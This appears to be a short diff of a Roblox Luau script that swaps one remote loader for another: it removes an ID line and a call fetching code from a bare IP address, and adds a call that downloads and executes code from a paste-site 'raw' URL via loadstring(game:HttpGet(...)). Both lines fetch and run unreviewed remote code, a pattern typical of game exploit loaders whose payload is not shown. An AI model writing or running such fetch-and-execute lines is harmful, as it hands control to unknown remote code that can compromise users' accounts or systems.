@@ -1,2 +1,1 @@
-ID="3c2d1792-66e8-4ed9-902a-bd231c13e06d";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/lWXOM6soOg4bAr25/raw"))()
